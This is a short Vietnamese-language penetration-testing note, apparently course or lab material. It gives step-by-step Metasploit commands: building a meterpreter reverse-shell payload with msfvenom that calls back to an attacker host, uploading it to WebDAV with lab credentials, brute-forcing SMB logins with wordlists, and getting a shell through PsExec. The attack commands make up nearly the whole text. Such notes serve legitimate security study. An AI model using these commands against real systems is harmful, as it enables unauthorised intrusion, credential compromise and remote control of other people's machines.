# Exploit

## WebDAV

[WebDAV enum](<../../../1. Assessment Methodologies & Audit/4. Vulnerability Assessment/WebDAV.md>)

### Exploiting WebDAV With Metasploit


`Credentials provided: bob:password_123321`

Tạo shell, payload: `msfvenom`

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP attacker> LPORT=1234 -f asp > shell.asp`

Tải payload lên WebDAV:

`cadaver http://IP/<path to webdav>` -> nhập user/pass

`put /root/shell.asp`

Mở port nghe và có thể kích hoạt shell

Mở port lắng nghe trên MSF:

`use multi/handler`

`set payload windows/meterpreter/reverse_tcp`

`set LHOST IP`

`set LPORT <port>`

`run`

Tự động việc tải shell và lắng nghe port trên MSF:

`use exploit/iis/iis_webdav_upload_asp`

`set RHOSTS IP`

`set HttpUsername bob`

`set HttpPassword password_123321`

`set PATH /<path to webdav>/metasploit.asp`

`exploit`

### Lab



---
## Exploiting SMB With PsExec

PsExec cho phép thực thi các tiến trình trên hệ thống từ xa

Xác thực của PsExec được thông qua SMB

`nmap -sV -sC IP`

Vào MSF:

`use auxiliary/scanner/smb/smb_login`

`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

`set RHOSTS IP`

`run` => tìm được tài khoản `sysadmin`, `administrator`

`psexec.py <username>@IP cmd.exe` -> nhập password 

-> ta sẽ có được shell

Ta cũng có thể thực hiện với MSF:

`use exploit/windows/smb/psexec`

`set RHOSTS IP`

`set SMBUser Administrator`

`set SMBPass <pass>`

---

## Eternal Blue 

[Xem thêm](<../../../1. Assessment Methodologies & Audit/4. Vulnerability Assessment/readme.md>)

---

## Exploit RDP

[Xem thêm](<Exploit RDP.md>)

## Exploit WinRM

[Xem thêm](<Exploit WinRM.md>)









